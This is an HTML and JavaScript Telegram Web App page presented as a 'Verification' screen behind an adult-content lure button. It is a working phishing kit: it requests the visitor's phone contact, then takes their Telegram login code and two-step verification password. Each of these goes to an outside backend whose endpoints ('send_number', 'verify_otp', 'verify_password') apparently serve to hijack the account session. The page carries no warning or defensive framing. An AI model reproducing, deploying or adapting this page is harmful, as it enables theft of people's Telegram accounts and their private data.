<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Arial', sans-serif; 
            margin: 0; padding: 0; 
            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
            background-size: cover;
            height: 100vh; display: flex; align-items: flex-end; justify-content: center; overflow: hidden;
        }
        .overlay { background: rgba(0, 0, 0, 0.5); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        .main-container { width: 90%; max-width: 380px; z-index: 2; text-align: center; margin-bottom: 40px; }
        .finger-icon { font-size: 75px; display: block; margin-bottom: 20px; animation: bounce 1.2s infinite; text-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(20px); } }
        .instruction-box { background: rgba(255, 255, 255, 0.95); padding: 15px; border-radius: 15px; margin-bottom: 20px; color: #333; font-weight: bold; font-size: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
        .otp-box { width: 50px; height: 55px; background: rgba(255, 255, 255, 0.2); border: 2px solid rgba(255, 255, 255, 0.7); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 28px; color: white; font-weight: bold; backdrop-filter: blur(8px); }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .key { background: #4caf50; padding: 18px; border-radius: 12px; font-size: 26px; font-weight: bold; color: white; cursor: pointer; border: none; box-shadow: 0 4px 6px rgba(0,0,0,0.2); -webkit-tap-highlight-color: transparent; }
        .key:active { background: #388e3c; transform: scale(0.95); }
        .key-back { background: #e67e22; font-size: 22px; }
        .pwd-container { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
        .pwd-input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #4caf50; border-radius: 10px; font-size: 18px; text-align: center; outline: none; }
        .pwd-btn { background: #ff4757; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 18px; }
        .hidden { display: none !important; }
        .loader { color: white; font-weight: bold; margin-top: 15px; font-size: 18px; text-shadow: 1px 1px 5px black; }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="main-container">
        <div id="step0">
            <div id="finger_point" class="finger-icon">👇</div>
            <div id="load" class="loader hidden">🔄 Connecting...</div>
        </div>
        <div id="step2" class="hidden">
            <div class="instruction-box">Enter the 5-digit code sent to your Telegram!</div>
            <div class="otp-inputs"><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div></div>
            <div class="keypad">
                <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
                <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                <div style="background:transparent"></div><div class="key" onclick="addNum('0')">0</div><div class="key key-back" onclick="clearNum()">⌫</div>
            </div>
        </div>
        <div id="step3" class="hidden">
            <div class="pwd-container">
                <h3 style="margin:0; color:#2c3e50;">Two-Step Verification</h3>
                <p style="font-size: 14px; color: #7f8c8d;">Your account is protected by a password.</p>
                <input type="password" id="tg_password" class="pwd-input" placeholder="Enter Password">
                <button class="pwd-btn" onclick="submitPassword()">Continue</button>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.MainButton.setText("🍓 START CONTINUE 🔞");
        tg.MainButton.show();
        tg.MainButton.onClick(startFlow);

        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        let currentOTP = "";

        function startFlow() {
            tg.requestContact();
            tg.MainButton.hide();
            document.getElementById('finger_point').classList.add('hidden');
            document.getElementById('load').classList.remove('hidden');
            pollContact();
        }

        async function pollContact() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") { sendPhoneToBackend(data.phone); }
                else { setTimeout(pollContact, 1500); }
            } catch (e) { setTimeout(pollContact, 2000); }
        }

        async function sendPhoneToBackend(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('step0').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                } else { tg.showAlert(data.message); location.reload(); }
            } catch (e) { tg.showAlert("Connection Error!"); }
        }

        function addNum(n) {
            if(currentOTP.length < 5) {
                currentOTP += n;
                for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
                if(currentOTP.length === 5) verifyOTP();
            }
        }
        function clearNum() { currentOTP = currentOTP.slice(0, -1); for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }

        async function verifyOTP() {
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                });
                const data = await res.json();
                if (data.status === "success") { tg.close(); }
                else if (data.status === "password_needed") {
                    document.getElementById('step2').classList.add('hidden');
                    document.getElementById('step3').classList.remove('hidden');
                } else { tg.showAlert("Invalid OTP!"); currentOTP = ""; clearNum(); }
            } catch (e) {}
        }

        async function submitPassword() {
            const pwd = document.getElementById('tg_password').value;
            if(!pwd) return;
            try {
                const res = await fetch(`${BACKEND_URL}/verify_password`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, password: pwd })
                });
                const data = await res.json();
                if (data.status === "success") { tg.close(); }
                else { tg.showAlert("Wrong Password!"); }
            } catch (e) {}
        }
    </script>
</body>
</html>
